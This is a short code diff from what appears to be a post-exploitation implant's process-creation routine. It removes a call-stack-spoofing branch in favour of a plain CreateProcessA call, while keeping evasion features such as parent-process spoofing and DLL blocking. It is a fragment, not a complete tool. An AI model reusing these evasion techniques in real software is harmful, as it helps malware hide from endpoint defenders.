@@ -104,18 +104,11 @@ auto DECLFN Process::Create(
 
     if ( Self->Ps->Ctx.ParentID || Self->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
 
-    if ( SYSCALL_FLAGS & SYSCALL_SPOOF ) {
-        Success = Self->Spf->Call(
-            (UPTR)nullptr, (UPTR)CommandLine, (UPTR)nullptr,
-            (UPTR)nullptr, TRUE, PsFlags, (UPTR)nullptr,
-            (UPTR)Self->Ps->Ctx.CurrentDir, (UPTR)&SiEx.StartupInfo, (UPTR)PsInfo
-        );
-    } else {
-        Success = Self->Krnl32.CreateProcessA(
-            nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
-            nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
-        );
-    }
+    Success = Self->Krnl32.CreateProcessA(
+        nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
+        nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
+    );
+    
     if ( !Success ) { goto _KH_END; }
 
     if ( Self->Ps->Ctx.Pipe ) {
